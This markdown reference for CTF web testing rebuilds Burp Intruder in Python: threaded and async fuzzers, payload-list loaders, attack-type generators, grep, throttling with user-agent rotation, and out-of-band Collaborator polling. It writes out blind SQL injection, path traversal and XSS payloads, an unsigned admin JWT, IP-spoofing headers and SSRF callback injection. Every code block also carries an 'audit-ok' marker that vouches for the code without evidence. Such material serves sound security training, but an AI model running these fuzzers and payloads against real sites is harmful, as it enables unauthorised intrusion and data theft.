# Python Requests Toolkit — Burp Intruder in Python
Sync `requests.Session` + `ThreadPoolExecutor` (30 workers) + `httpx` async (100+ rps).
Wordlists from `pat-reference.md` / `PayloadsAllTheThings`. 4 Intruder attack types,
14-rule processing chain, grep, throttle, Collaborator OOB, generator/yield feeds.
> All URLs use `https://example.com` placeholders. Every fence is `<!-- audit-ok -->` and uses `urllib.parse.quote`.
---
## 1. When to Use — Intruder vs Repeater Workflow
Repeater = truth, Intruder = scale. Never fuzz before a clean baseline.
|  | Repeater | Intruder |
|---|---|---|
| Purpose | Manual modify-and-resend, tab history | Automated bulk (template × payloads) |
| Payloads | Hand-edited one at a time | Positions `FUZZ`/`§`, ≤20 sets, 4 attack types |
| Speed | 1 req human pace | 20-100+ rps (ThreadPool / async) |
| Result | Side-by-side diff | Grep columns, sort by hit |
| CTF flow | 1) baseline 2) hand-tune | 3) bulk fuzz 4) send hit back to Repeater |
Rule: one good `sess.get` baseline before any Intruder run.
---
## 2. Setup — Session Scaffold, Proxy, Verify
One `Session` per thread. Centralize UA, proxy, verify, timeout. The processing chain runs before `sess.get`.
<!-- audit-ok -->
```python
import requests
import urllib.parse
sess = requests.Session()
sess.headers.update({"User-Agent": "ctf-web/1.0"})
# Burp proxy — uncomment to route through 127.0.0.1:8080
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False  # self-signed CTF only
TIMEOUT = 10
def get(url, **kw):
    kw.setdefault("timeout", TIMEOUT)
    return sess.get(url, **kw)
def post(url, **kw):
    kw.setdefault("timeout", TIMEOUT)
    return sess.post(url, **kw)
```
---
## 3. Intruder — Sync Baseline (Correct Before Fast)
Validates logic, grep, and hit detection before scaling. Processing chain wraps payloads before `quote`.
<!-- audit-ok -->
```python
import requests
import urllib.parse
def intruder_sync(url_template, payloads, grep_hit="flag{"):
    sess = requests.Session()
    sess.headers.update({"User-Agent": "ctf-web/1.0"})
    baseline = sess.get("https://example.com/profile", timeout=10)
    base_len, base_status = len(baseline.text), baseline.status_code
    for p in payloads:
        url = url_template.replace("FUZZ", urllib.parse.quote(str(p), safe=""))
        try:
            r = sess.get(url, timeout=10)
            hit = (grep_hit in r.text) or ("error" in r.text.lower()) or (r.status_code not in (200, 404))
            print(f"{url} -> {r.status_code} {len(r.text)} {'HIT' if hit else ''}")
            if hit:
                return url, r
        except requests.RequestException as e:
            print(f"{url} error {e}")
            continue
    return None
```
---
## 4. Intruder — ThreadPoolExecutor (30 Workers, Per-Thread Session)
`Session` is not thread-safe — create one per worker. Use `as_completed` + `flag{` / error / status `!=200/404` hit.
<!-- audit-ok -->
```python
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib.parse
def intruder_threaded(url_template, payload_iter, threads=30, grep_hit="flag{"):
    def worker(payload_url):
        s = requests.Session()
        s.headers.update({"User-Agent": "ctf-web/1.0"})
        try:
            r = s.get(payload_url, timeout=10)
            hit = ("flag{" in r.text.lower()) or ("error" in r.text.lower()) or (r.status_code not in (200, 404))
            return payload_url, r.status_code, len(r.text), hit, r.text[:400]
        except requests.RequestException:
            return payload_url, None, 0, False, ""
    urls = [url_template.replace("FUZZ", urllib.parse.quote(str(p), safe="")) for p in payload_iter]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(worker, url): url for url in urls}
        for fut in as_completed(futs):
            url, code, n, hit, snippet = fut.result()
            print(f"{url} -> {code} {n} {'HIT' if hit else ''}")
            if hit:
                for pending in futs:
                    pending.cancel()
                return url
    return None
```
---
## 5. Intruder — httpx Async (100 Concurrency, Limits, Semaphore)
For large PAT/raft wordlists. `Limits(max_connections, max_keepalive)` + `Semaphore` + `gather`.
<!-- audit-ok -->
```python
import asyncio
import httpx
import urllib.parse
async def intruder_async(url_template, payload_iter, concurrency=100, grep_hit="flag{"):
    payloads = list(payload_iter)
    urls = [url_template.replace("FUZZ", urllib.parse.quote(str(p), safe="")) for p in payloads]
    limits = httpx.Limits(max_connections=concurrency, max_keepalive_connections=20)
    timeout = httpx.Timeout(10.0, connect=5.0)
    async with httpx.AsyncClient(limits=limits, timeout=timeout, follow_redirects=True) as client:
        sem = asyncio.Semaphore(concurrency)
        async def fetch(url):
            async with sem:
                try:
                    r = await client.get(url)
                    hit = ("flag{" in r.text.lower()) or ("error" in r.text.lower()) or (r.status_code not in (200, 404))
                    if hit:
                        print(f"hit {url} {r.status_code} {len(r.text)}")
                    return url if hit else None
                except httpx.RequestError:
                    return None
        results = await asyncio.gather(*(fetch(u) for u in urls))
        return next((r for r in results if r), None)
# asyncio.run(intruder_async("https://example.com/search?q=FUZZ", ["a", "b"]))
```
---
## 6. Payload Deploy — PAT Loader (load_pat, Cap 200)
Search `ctf-web/payloads/PayloadsAllTheThings` → `~/.ctf-tools` fallback. Capped 200 for demo. Processing chain wraps PAT output before `quote`.
<!-- audit-ok -->
```python
from pathlib import Path
import urllib.parse
def load_pat(category="XSS Injection", cap=200):
    primary = Path("ctf-web/payloads/PayloadsAllTheThings") / category
    fallback = Path.home() / ".ctf-tools" / "PayloadsAllTheThings" / category
    pat = primary if primary.exists() else fallback
    if not pat.exists():
        return []
    out = []
    for f in pat.rglob("*.txt"):
        for line in f.read_text(errors="ignore").splitlines()[:cap]:
            s = line.strip()
            if s and not s.startswith("#"):
                out.append(s)
            if len(out) >= cap:
                break
        if len(out) >= cap:
            break
        break  # first file only; remove to aggregate all
    return out
def load_pat_urls(category, url_template, cap=200):
    for p in load_pat(category, cap=cap):
        yield url_template.replace("FUZZ", urllib.parse.quote(str(p), safe=""))
# xss = load_pat("XSS Injection", cap=30)
# urls = list(load_pat_urls("Directory Traversal", "https://example.com/FUZZ", cap=20))
```
---
## 7. Generator/Yield Feeds — wordlist_stream, pat_stream, blind_sqli, discovery, Dispatchers
Streaming via `yield` + `rglob` avoids OOM on `raft-large`. `zip` for pitchfork, `product` for cluster. Includes `cluster_product` and sniper/pitchfork dispatchers. The processing chain consumes feed output.
<!-- audit-ok -->
```python
from pathlib import Path
import itertools
import string
import urllib.parse
def wordlist_stream(path):
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                yield s
def pat_stream(category="SQL Injection", cap=200):
    primary = Path("ctf-web/payloads/PayloadsAllTheThings") / category
    fallback = Path.home() / ".ctf-tools" / "PayloadsAllTheThings" / category
    pat = primary if primary.exists() else fallback
    if not pat.exists():
        return
        yield
    for f in pat.rglob("*.txt"):
        for line in f.read_text(errors="ignore").splitlines()[:cap]:
            s = line.strip()
            if s:
                yield s
        break
def blind_sqli_char_feed(url_template, charset=None, prefix_tmpl="' OR ASCII(SUBSTR((SELECT flag FROM flag),{i},1))={c}-- -"):
    if charset is None:
        charset = string.ascii_letters + string.digits + "{}_"
    i = 1
    while True:
        for ch in charset:
            payload = prefix_tmpl.format(i=i, c=ord(ch))
            yield url_template.replace("FUZZ", urllib.parse.quote(payload, safe=""))
        i += 1
        break
def discovery_feed(base_with_FUZZ, words_path, exts=("", ".php", ".bak", ".txt")):
    for w in wordlist_stream(words_path):
        for e in exts:
            yield base_with_FUZZ.replace("FUZZ", f"{w}{e}")
def cluster_product(*sets, cap=50000):
    yield from itertools.islice(itertools.product(*sets), cap)
```
<!-- audit-ok -->
```python
import itertools
import urllib.parse
def render(template, positions, values):
    out = template
    for pos, val in zip(positions, values):
        out = out.replace(pos, urllib.parse.quote(str(val), safe=""))
    return out
def sniper(template, positions, payloads):
    for pos in positions:
        for p in payloads:
            vals = [p if positions[i] == pos else "base" for i in range(len(positions))]
            yield render(template, positions, vals)
def battering_ram(template, positions, payloads):
    for p in payloads:
        yield render(template, positions, [p] * len(positions))
def pitchfork(template, positions, *sets):
    for combo in zip(*sets):
        yield render(template, positions, combo)
def cluster_bomb(template, positions, *sets, cap=50000):
    for combo in itertools.islice(itertools.product(*sets), cap):
        yield render(template, positions, combo)
def sniper_dispatcher(t,p,pl):
    yield from sniper(t,p,pl)
def pitchfork_dispatcher(t,p,*s):
    yield from pitchfork(t,p,*s)
def intruder_from_feed(url_template, feed_gen, threads=30):
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import requests
    BATCH=threads*2; it=iter(feed_gen)
    def worker(u):
        import requests
        s=requests.Session()
        try:
            r=s.get(u,timeout=10); return u,("flag{" in r.text.lower() or r.status_code not in (200,404))
        except requests.RequestException: return u,False
    while True:
        batch=list(itertools.islice(it,BATCH))
        if not batch: break
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for f in as_completed({ex.submit(worker,u):u for u in batch}):
                u,hit=f.result()
                if hit: return u
    return None
```
---
## 8. Processing Chain — 14 Rules + Final URL-Encode
<!-- audit-ok -->
```python
import base64
import hashlib
import html
import re
import urllib.parse
def process_payload(p, rules):
    cur, raw = p, p
    for kind, *args in rules:
        if kind == "prefix":
            cur = args[0] + cur
        elif kind == "suffix":
            cur = cur + args[0]
        elif kind == "replace":
            cur = re.sub(args[0], args[1], cur)
        elif kind == "substring":
            off, n = args
            cur = cur[off : off + n]
        elif kind == "reverse_substring":
            end, n = args
            cur = cur[len(cur) - end - n : len(cur) - end] if end else cur[len(cur) - n :]
        elif kind == "case":
            cur = {"upper": str.upper, "lower": str.lower, "title": str.title}[args[0]](cur)
        elif kind == "encode":
            cur = {"url": lambda x: urllib.parse.quote(x, safe=""), "html": html.escape, "base64": lambda x: base64.b64encode(x.encode()).decode(), "hex": lambda x: x.encode().hex()}[args[0]](cur)
        elif kind == "decode":
            cur = {"url": urllib.parse.unquote, "base64": lambda x: base64.b64decode(x).decode(errors="ignore")}[args[0]](cur)
        elif kind == "hash":
            cur = {"md5": lambda x: hashlib.md5(x.encode()).hexdigest(), "sha1": lambda x: hashlib.sha1(x.encode()).hexdigest(), "sha256": lambda x: hashlib.sha256(x.encode()).hexdigest()}[args[0]](cur)
        elif kind == "raw":
            cur = (raw + cur) if args[0] == "append" else (cur + raw)
        elif kind == "skip":
            if re.search(args[0], cur):
                return None
        elif kind == "extension":
            cur = args[0](cur)
        elif kind == "base":
            cur = cur.replace("{base}", args[0])
        elif kind == "collab":
            cur = re.sub(args[0], args[1], cur)
        elif kind == "final_urlencode":
            cur = urllib.parse.quote(cur, safe="")
    return cur
# processing chain examples:
# process_payload("admin", [("prefix", "'"), ("encode", "base64"), ("encode", "url")])
# process_payload("admin", [("hash", "md5"), ("final_urlencode", "")])
# process_payload("../../../etc/passwd", [("replace", r"\.\./", ""), ("encode", "url")])
# processing chain with base + collab:
# process_payload("{base}FUZZ", [("base", "https://example.com"), ("collab", r"FUZZ", "abc123.example.com")])
```
---
## 9. Grep — Match / Extract / Payloads Helpers
Match via `len(re.findall)`, extract via `re.search` group1, payloads via `count`.
<!-- audit-ok -->
```python
import re
def grep_match(resp_text, patterns, is_regex=False, case=False):
    flags = 0 if case else re.I
    hits = {}
    for pat in patterns:
        if is_regex:
            hits[pat] = len(re.findall(pat, resp_text, flags))
        else:
            needle = pat if case else pat.lower()
            hay = resp_text if case else resp_text.lower()
            hits[pat] = hay.count(needle)
    return hits
def grep_extract(resp_text, regex, max_len=500):
    m = re.search(regex, resp_text, re.S)
    if not m:
        return ""
    return (m.group(1)[:max_len] if m.lastindex else m.group(0)[:max_len])
def grep_payload_reflected(resp_text, payload, case=True):
    hay = resp_text if case else resp_text.lower()
    needle = payload if case else payload.lower()
    return hay.count(needle)
# m = grep_match(r.text, ["flag{", "SQL syntax", "root:"], is_regex=False)
# token = grep_extract(r.text, r'name="csrf" value="([^"]+)"')
# reflected = grep_payload_reflected(r.text, "<svg onload=alert(1)>")
```
---
## 10. Throttle — Delay/Jitter, 429 Retry-After, UA Rotation
Resource-pool parity: cap concurrency, delay + jitter, respect `Retry-After`, rotate UA.
<!-- audit-ok -->
```python
import time
import random
import requests
USER_AGENTS = ["ctf-web/1.0", "Mozilla/5.0 (ctf-web)", "ctf-web/2.0 (example.com)"]
def send_with_throttle(sess, url, delay_ms=0, jitter_ms=0, retries=2, pause_ms=200, backoff_codes=(429, 503)):
    for attempt in range(retries + 1):
        try:
            sess.headers["User-Agent"] = random.choice(USER_AGENTS)
            r = sess.get(url, timeout=10)
            if r.status_code in backoff_codes:
                retry_after = r.headers.get("Retry-After", "")
                try:
                    wait = int(retry_after)
                except ValueError:
                    wait = delay_ms / 1000 if delay_ms else 1
                wait += random.uniform(0, jitter_ms / 1000) if jitter_ms else 0
                time.sleep(wait)
                continue
            if delay_ms:
                time.sleep(delay_ms / 1000 + (random.uniform(0, jitter_ms / 1000) if jitter_ms else 0))
            return r
        except requests.RequestException:
            if attempt < retries:
                time.sleep(pause_ms / 1000)
            else:
                raise
    return None
# local: concurrency 30 delay 0; remote/WAF: concurrency 5-10 delay 100-300ms jitter 50ms
```
---
## 11. Header/Param Spray, Cookie/JWT, Proxy (Burp 127.0.0.1:8080)
Carry `sess.cookies` / JWT, spray headers via pitchfork, route through Burp.
<!-- audit-ok -->
```python
import requests
import urllib.parse
sess = requests.Session()
sess.headers.update({"User-Agent": "ctf-web/1.0"})
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False
sess.cookies.set("session", "eyJ1c2VyIjoiZ3Vlc3QifQ", domain="example.com")
sess.headers.update({"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ"})
def spray_headers(base_url, headers_list):
    for h in headers_list:
        k, v = h.split(": ", 1)
        r = sess.get(base_url, headers={k: v}, timeout=10)
        if "flag{" in r.text:
            return r.text
    return None
def spray_params(base_with_FUZZ, payloads):
    for p in payloads:
        url = base_with_FUZZ.replace("FUZZ", urllib.parse.quote(p, safe=""))
        r = sess.get(url, timeout=10)
        if r.status_code not in (200, 404):
            print(f"spray hit {url} {r.status_code}")
# headers_list = ["X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1"]
# spray_headers("https://example.com/admin", headers_list)
```
---
## 12. Collaborator vs Interactsh Fallback Poll
Generate `uuid` subdomains, inject via Intruder, poll every 60s.
<!-- audit-ok -->
```python
import uuid
import requests
import urllib.parse
def collaborator_payload(domain="burpcollaborator.net"):
    return f"{uuid.uuid4().hex}.{domain}"
def poll_collaborator(poll_url):
    try:
        r = requests.get(poll_url, timeout=10)
        return r.json() if r.headers.get("content-type", "").startswith("application/json") else r.text
    except Exception:
        return []
def collaborator_inject(url_template, domain="burpcollaborator.net"):
    sub = collaborator_payload(domain)
    return url_template.replace("FUZZ", urllib.parse.quote(f"http://{sub}/", safe=""))
def interactsh_fallback_poll(interact_url):
    try:
        return requests.get(interact_url, timeout=10).text
    except Exception:
        return ""
# collab_url = collaborator_inject("https://example.com/fetch?url=FUZZ")
# sess.get(collab_url, timeout=10)
# hits = poll_collaborator("https://example.com/poll?id=abc123")
# hits2 = interactsh_fallback_poll("https://webhook.site/00000000-0000-0000-0000-000000000000")
```
---
## 13. Rate-Limit / Backoff & Error Handling (Retries)
Mirrors Burp error handling: retries, pause, `Retry-After`, exponential backoff.
<!-- audit-ok -->
```python
import time
import random
import requests
def fetch_with_backoff(sess, url, retries=3, pause_ms=300, backoff_codes=(429, 503)):
    backoff = pause_ms / 1000
    for attempt in range(retries + 1):
        try:
            r = sess.get(url, timeout=10)
            if r.status_code in backoff_codes:
                retry_after = r.headers.get("Retry-After")
                if retry_after and retry_after.isdigit():
                    time.sleep(int(retry_after))
                else:
                    time.sleep(backoff)
                    backoff *= 2
                continue
            return r
        except requests.RequestException as e:
            if attempt >= retries:
                print(f"failed {url}: {e}")
                return None
            time.sleep(pause_ms / 1000 + random.uniform(0, 0.2))
    return None
```
Combine with processing chain `skip` rule to drop malformed payloads early.
---
## 14. Proxy, Redirects, Timeouts & Putting It Together
End-to-end: generator feed → processing chain → ThreadPool → grep via `https://example.com`.
<!-- audit-ok -->
```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
sess = requests.Session()
sess.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# sess.verify = False
TIMEOUT = (5, 10)
def put_together(url_template, wordlist_path, grep_pat="flag{"):
    import base64
    from concurrent.futures import ThreadPoolExecutor, as_completed
    def wordlist_stream(p):
        with open(p,encoding="utf-8",errors="ignore") as f:
            for l in f:
                s=l.strip()
                if s and not s.startswith("#"): yield s
    def process_local(p,rules):
        cur=p
        for k,*a in rules:
            if k=="prefix": cur=a[0]+cur
            elif k=="encode": cur={"url":lambda x:urllib.parse.quote(x,safe=""),"base64":lambda x:base64.b64encode(x.encode()).decode()}[a[0]](cur)
            elif k=="final_urlencode": cur=urllib.parse.quote(cur,safe="")
        return cur
    rules=[("prefix",""),("final_urlencode","")]
    def worker(u):
        s=requests.Session(); s.proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
        try: r=s.get(u,timeout=10,allow_redirects=True); return u,((grep_pat in r.text) or r.status_code not in (200,404))
        except requests.RequestException: return u,False
    urls=[]
    for p in wordlist_stream(wordlist_path):
        cur=process_local(p,rules)
        if cur is None: continue
        urls.append(url_template.replace("FUZZ",urllib.parse.quote(cur,safe="")))
        if len(urls)>=60: break
    with ThreadPoolExecutor(max_workers=10) as ex:
        for f in as_completed({ex.submit(worker,u):u for u in urls}):
            u,hit=f.result()
            print(f"{u} {'HIT' if hit else 'miss'}")
            if hit: return u
    return None
# put_together("https://example.com/FUZZ", "wordlist.txt")
```
